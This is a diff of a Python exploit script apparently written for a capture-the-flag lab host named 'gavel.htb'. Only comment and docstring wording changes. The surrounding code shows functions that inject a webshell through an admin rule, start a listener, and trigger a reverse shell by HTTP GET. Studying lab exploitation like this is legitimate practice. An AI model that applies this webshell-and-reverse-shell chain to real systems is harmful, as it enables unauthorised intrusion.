@@ -138,7 +138,7 @@ def gen_shell_name(prefix="shell_", length=8):
     
 def send_webshell_text(session, auctions):
     """
-    Inject a webshell via admin rule for each auction dict in `auctions`.
+    Inject a webshell via admin rule for each auction dict in auctions.
     auctions: list of {'id': ..., 'end': ...}
     Returns the shell_name for reference.
     """
@@ -228,7 +228,7 @@ def place_bid(session, auction_id, bid_amount):
         j = {}
         logging.debug(r.text)
 
-    return j   # <-- CRITICAL: return dict, NOT Response
+    return j   #return dictionary
 
 
 def start_listener(port):
@@ -242,9 +242,9 @@ def start_listener(port):
     )
 
 def trigger_shell(session, shell_name):
-    """
-    Simple HTTP GET to execute the reverse shell payload.
-    """
+    
+    # Simple HTTP GET to execute the reverse shell payload.
+    
     url = f"http://gavel.htb/includes/{shell_name}"
     logging.info(f"[+] Triggering shell via {url}")
     try:
